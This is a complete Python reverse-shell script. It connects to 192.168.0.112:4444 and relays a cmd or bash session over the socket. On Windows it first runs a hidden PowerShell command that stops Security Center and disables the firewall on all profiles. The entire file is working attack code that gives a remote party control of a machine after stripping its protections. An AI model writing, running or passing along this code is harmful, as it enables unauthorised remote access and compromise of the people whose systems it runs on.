import os
import socket
import subprocess
import threading

IS_WINDOWS = os.name == "nt"
SHELL_TYPE = "cmd" if IS_WINDOWS else "bash"

def disable_security_and_firewall_windows():
    if not IS_WINDOWS:
        return

    ps_commands = (
        "Stop-Service -Name wscsvc -Force; "
        "Set-Service -Name wscsvc -StartupType Disabled; "
        "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
    )


    subprocess.Popen(
        [
            "powershell.exe",
            "-NoProfile",
            "-NonInteractive",
            "-WindowStyle", "Hidden",
            "-Command", ps_commands
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        shell=True
    )

def s2p(s, p):
    try:
        while True:
            data = s.recv(1024)
            if not data:
                break
            p.stdin.write(data.decode('utf-8', errors='ignore'))
            p.stdin.flush()
    except:
        pass

def p2s(s, p):
    try:
        while True:
            output = p.stdout.readline()
            if not output:
                break
            s.send(output.encode())
    except:
        pass

if __name__ == "__main__":
    if IS_WINDOWS:
        disable_security_and_firewall_windows()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.0.112", 4444))

    startupinfo = None
    if IS_WINDOWS:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    p = subprocess.Popen(
        [SHELL_TYPE],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True,
        startupinfo=startupinfo
    )

    threading.Thread(target=s2p, args=(s, p), daemon=True).start()
    threading.Thread(target=p2s, args=(s, p), daemon=True).start()

    try:
        p.wait()
    except KeyboardInterrupt:
        pass
    finally:
        s.close()
